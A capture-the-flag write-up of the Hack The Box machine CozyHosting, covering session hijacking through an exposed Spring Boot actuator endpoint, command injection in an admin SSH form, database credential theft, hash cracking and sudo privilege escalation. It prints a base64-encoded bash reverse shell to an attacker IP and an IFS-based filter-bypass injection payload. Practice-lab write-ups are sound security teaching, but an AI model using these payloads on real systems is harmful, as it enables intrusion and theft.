**Easy Box by HTB - CozyHosting☕**

This box has been active for a while, and I finally got to it! Let's get started!

## Enumeration
As always, let's start with a nmap scan to find open ports.

![nmap scan](https://github.com/NTHSec/CTF-Writeups/assets/150489159/2b6566e2-4eba-47df-8c10-680111120d36)

Nothing too crazy, although that python server on port 8000 looks interesting, let's mark it down and move onto port 80, which we know is probably going to contain a website.

Indeed it does! Here is our website

![website](https://github.com/NTHSec/CTF-Writeups/assets/150489159/1fa42e0e-6504-485f-9374-aa94b4828a2b)

While we explore the website, it is a good idea to have GoBuster running in the background to find any hidden directories.

![gobuster](https://github.com/NTHSec/CTF-Writeups/assets/150489159/3b3264ad-c044-4466-956f-d60cbc97ecb1)

Not anything too out of the blue here, let's first look at the login page.

![login screen](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d27cda66-8cb1-495d-841e-9159628d9ff9)

Here is the login page, and nothing seems too out of place, but the big thing I noticed here was the “Designed by BootstrapMade”. This makes me think that there might be an outdated version that we can exploit here.

As suspected, in the source code (I got here by pressing CTRL + U on Firefox) there is this lovely looking comment that tells us the version that is being used on the login page. Considering that it was made in March, there is likely and exploit already available.

![source code](https://github.com/NTHSec/CTF-Writeups/assets/150489159/1208b76c-5013-4bcb-972f-13ebcff4a82a)

After digging around a bit though, I couldn't find any exploits for this particular version that matched our needs, so we have to move onto a different strategy.

## Session Hijacking

After recognizing that this application was most likely made with Spring Boot, I tried enumerating the `/actuator` path, which is common for Spring Boot applcations. I got lucky, and was able to find an exposed endpoint at `/actuator/sessions`!

![exposed endpoint](https://github.com/NTHSec/CTF-Writeups/assets/150489159/98c475b2-2234-4cb7-a5c4-a8938b577971)

Looking further at this endpoint, we are able to find the user 'kanderson' and his corresponding session cookie!

![exposed cookie](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8ef2ba83-20d9-4611-99d3-f04244e0dea5)
 
Now that we have his cookie, we can simply edit the cookies on the login page. By inserting the cookie as show below, all we need to do now is refresh and bam! We’re in!

![session hijacking](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c55defb2-68d4-4d1b-aff4-f46d4f70125f)

Admin page:

![admin website](https://github.com/NTHSec/CTF-Writeups/assets/150489159/bef666f4-d549-4454-8ee6-7e2bcdddbfc6)

## Exploring the Admin Page

The only thing that I found that was remotely interesting was at the bottom of the page, where there is a functionality which pretty much acts as an ssh connection.

![ssh login](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d341b6e4-6afb-41e4-a8f7-1f3a20a3c145)

After trying to submit some sample text, this was the response:

![ssh sample test](https://github.com/NTHSec/CTF-Writeups/assets/150489159/988da8ac-3a68-41f5-8dfa-00a7db295d88)

Hmmm, maybe we can do something with this functionality to give us an exploit vector?

## Exploitation with Burp Suite

After sending more sample info, I intercepted the request with burp. For the hostname I submitted the burp listener IP {127.0.0.1} with the username being kanderson.

![burp](https://github.com/NTHSec/CTF-Writeups/assets/150489159/3f29b12e-dc3b-44e0-be3a-666acf1f2dba)

In theory, we can change the username to a reverse shell bash script and we will have our shell! Of course, this is easier said than done. Here we go!

First, lets make our shell. This command writes our shell in base64. 

![base64 shell](https://github.com/NTHSec/CTF-Writeups/assets/150489159/a75255fc-bdfc-4884-beb4-2d075b9394c3)

*Note: Make sure to change to your IP and preferred port number!*

Here is our reverse shell put together {the -d decodes the base64}: 
```
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40My80NDQ0IDA+JjEK" | base64 -d | bash
```

Let's try it in the username field!

![base64 shell in user](https://github.com/NTHSec/CTF-Writeups/assets/150489159/7285b29a-df3b-4f2a-839b-5ae5678b08a6)

Hmmm unfortunately, we cannot add a username with white spaces, fortunately, we can fix that by adding the `${IFS%??}` string, which is the same as a whitespace. So putting that together, we get the next iteration of our shell:

```
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40My80NDQ0IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

*Note: Make sure to add semicolons (;) at the beginning and end of your statement!*

But we're not done quite yet, we also need to URL encode our shell because our payload contains special characters, such as slashes ("/"), ampersands ("&"), and equal signs ("="). These characters have specific meanings in URLs and can interfere with the request. URL encoding replaces these characters with their encoded representations, ensuring they are correctly interpreted by the server.

We can use a tool called https://www.urlencoder.org/ to URL encode our shell.

![URL-encoded shell](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c8bcdb89-d033-4c11-b67d-65c53235ac1a)

Now that our shell is URL encoded, with no white spaces, we should be good to go! Let's try it out!

First step to any reverse shell is to set up your listener:

![nc listener](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d102caff-3aa8-4346-bba6-fbd8acc35eb8)

Now, here is the moment of truth!

![sending shell through burp](https://github.com/NTHSec/CTF-Writeups/assets/150489159/7528284a-d46a-4995-b389-3e966a67edc9)

We’re in! 

![revshell connection](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b81c7309-90ad-4f7d-ad09-da0429a45822)


To ensure your shell is stable, make sure to run this python script
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## File extraction & Lateral Movement

A quick `ls` shows us that we have a file called `cloudhosting-0.0.1.jar`. Let's extract this file and examine it on our attacker machine. To do this, you can use netcat.

Attacker machine:

![attacker machine extraction](https://github.com/NTHSec/CTF-Writeups/assets/150489159/ff33fd9d-5f96-4c0d-8be0-9a176595c647)

Victim machine:

![victim machine extraction](https://github.com/NTHSec/CTF-Writeups/assets/150489159/86d86074-b950-47f3-a855-5b682b9ebabe)

After this, I simply pressed CTRL + C to exit out of the connection and a quick `ls` showed that we have our database downloaded!

![DB downloaded](https://github.com/NTHSec/CTF-Writeups/assets/150489159/2937545d-d137-4fca-b717-5625b9b2ae5d)

To read the database, I used a tool called jd-gui, which is a gui to provide easy navigation through the database. With some quick navigation, we found postgres credentials! We also found kanderson’s login!

![jd-gui](https://github.com/NTHSec/CTF-Writeups/assets/150489159/ee2d4123-1ecc-4c39-a8b7-96ab05168dbd)

![username and password](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e55f5df8-d1af-46bc-8d2e-9faefe3cb274)

### Exploring the database

With these new found credentials, let's login to the SQL database and see if we can find any sensitive data. You can login to postgres like so:
```
psql -h 127.0.0.1 -U postgres
```
![logging into sql](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8bd552f4-2c7e-47f0-a950-968610136c26)

You can enumerate the database with a few simple steps:
 - Typing `\c cozyhosting` to connect to the cozyhosting database
 - Typing `\d` to display the tables

![users table](https://github.com/NTHSec/CTF-Writeups/assets/150489159/ce959f34-39aa-4b53-9886-76253c32d6c6)

We have a users table! Lets look at all the data by:
 - Typing `SELECT * from USERS;` to display all of the records on the users table.

We have an admin hash! 

![admin hash](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8e546f5e-68a8-4efa-a588-1f6ad7f24827)

Let's see if we can crack it!

### Hash Cracking

There are a couple ways I did this, one with a website, and one with john. With the website, you can simply search up "hash decoder" and click the first link. This worked very well for me!

![hash cracker website](https://github.com/NTHSec/CTF-Writeups/assets/150489159/14d7303d-e2cd-4f68-a161-af5994d3551a)

You can also user john, which was almost as easy!

![john hash crack](https://github.com/NTHSec/CTF-Writeups/assets/150489159/8626cf70-e53f-4908-bab2-4a3cdd94a199)

## Privilege Escalation
So now we have the password for a user, now we just need the name of our user! We can find this a couple ways, I ran `ls -la /home`, but you can also run `cat /etc/passwd | grep sh`, both work well.

![checking users](https://github.com/NTHSec/CTF-Writeups/assets/150489159/b55c5746-3e85-4bad-bb0a-7a38c161197e)

So we find our user "Josh", lets see if we can switch to him using the password we just found and the `su` command!

![switching to josh](https://github.com/NTHSec/CTF-Writeups/assets/150489159/c0ab488e-c46e-4ec1-ae52-c9d67a166f7c)

We can find the user flag in Josh's home directory:

![user flag](https://github.com/NTHSec/CTF-Writeups/assets/150489159/7cc4ec4c-07eb-4409-a0a0-a11d9fa99bd2)

As mentioned in previous writeups, **`sudo -l`** is your best friend when it comes to PrivEsc. Running it here, we see that we can run one command as sudo.

![sudo -l](https://github.com/NTHSec/CTF-Writeups/assets/150489159/e845c237-a942-47c7-80aa-79c66b9c998a)

This is a binary file, so it makes me wonder if we can find something on [GTFOBins](https://gtfobins.github.io/)?

Here we go! By running this one liner we should be able to obtain root!

![gtfobins](https://github.com/NTHSec/CTF-Writeups/assets/150489159/63fb866e-4836-4608-afb4-a6d3c9cb6203)

Executing this command and nice! We have root!

![root!](https://github.com/NTHSec/CTF-Writeups/assets/150489159/55cad218-36c4-40d0-8af0-ce46cc85e437)

Navigating to the /root directory, we can find the root flag and complete this box!

![root flag](https://github.com/NTHSec/CTF-Writeups/assets/150489159/d1cc7928-208d-45eb-9daf-7cbebaa43060)


**I hope you enjoyed the box as much as I did! This box really tested my enumeration skills, and problem solving when running into issues, especially with the reverse shell and URL encoding. Hope you learned something and happy hacking!**


